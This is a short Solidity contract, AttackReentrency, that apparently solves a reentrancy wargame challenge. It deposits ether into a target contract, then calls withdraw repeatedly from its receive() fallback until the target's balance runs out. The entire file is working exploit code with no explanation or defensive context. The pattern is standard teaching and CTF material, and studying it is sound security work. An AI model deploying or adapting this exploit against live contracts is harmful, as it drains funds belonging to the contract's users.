// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface Reentrency {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract AttackReentrency {
    Reentrency reentrencyContract;
    uint256 amount;


    function attack(address contractToAttack) public payable {
        reentrencyContract = Reentrency(contractToAttack);
        amount = msg.value;

        reentrencyContract.donate{value: amount}(address(this));
        reentrencyContract.withdraw(amount);
    }

    receive() external payable {
        if(address(reentrencyContract).balance >= amount) {
            reentrencyContract.withdraw(amount);
        }
    }
}
